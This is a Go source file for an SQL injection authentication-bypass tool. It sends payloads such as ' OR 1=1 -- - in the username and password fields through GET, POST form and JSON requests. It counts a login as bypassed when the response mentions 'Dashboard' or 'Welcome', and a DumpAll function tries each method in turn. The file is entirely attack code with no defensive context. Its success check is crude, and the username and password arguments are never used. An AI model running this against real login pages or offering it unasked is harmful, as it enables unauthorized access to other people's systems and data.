package auth_bypass

import (
"bytes"
"encoding/json"
"io"
"net/http"
"net/url"
"strings"
)

type SQLiAuthBypass struct {
URL    string
Client *http.Client
}

func NewSQLiAuthBypass(url string) *SQLiAuthBypass {
return &SQLiAuthBypass{
URL:    url,
Client: &http.Client{},
}
}

func (s *SQLiAuthBypass) BypassWithGET(username, password string) (bool, error) {
payload := url.Values{}
payload.Set("username", "' OR 1=1 -- -")
payload.Set("password", "' OR 1=1 -- -")
resp, err := http.Get(s.URL + "?" + payload.Encode())
if err != nil {
return false, err
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)
content := string(body)
return strings.Contains(content, "Dashboard") || strings.Contains(content, "Welcome") || strings.Contains(content, "200 OK"), nil
}

func (s *SQLiAuthBypass) BypassWithPOST(username, password string) (bool, error) {
payload := url.Values{}
payload.Set("username", "' OR '1'='1' -- -")
payload.Set("password", "' OR '1'='1' -- -")
resp, err := http.PostForm(s.URL, payload)
if err != nil {
return false, err
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)
content := string(body)
return strings.Contains(content, "Dashboard") || strings.Contains(content, "Welcome") || strings.Contains(content, "200 OK"), nil
}

func (s *SQLiAuthBypass) BypassWithJSON(username, password string) (bool, error) {
payload := map[string]string{
"username": "' OR '1'='1' -- -",
"password": "' OR '1'='1' -- -",
}
body, _ := json.Marshal(payload)
resp, err := http.Post(s.URL, "application/json", bytes.NewBuffer(body))
if err != nil {
return false, err
}
defer resp.Body.Close()
data, _ := io.ReadAll(resp.Body)
content := string(data)
return strings.Contains(content, "Dashboard") || strings.Contains(content, "Welcome") || strings.Contains(content, "200 OK"), nil
}

func (s *SQLiAuthBypass) DumpAll(username, password string) (bool, error) {
if ok, _ := s.BypassWithGET(username, password); ok {
return true, nil
}
if ok, _ := s.BypassWithPOST(username, password); ok {
return true, nil
}
return s.BypassWithJSON(username, password)
}
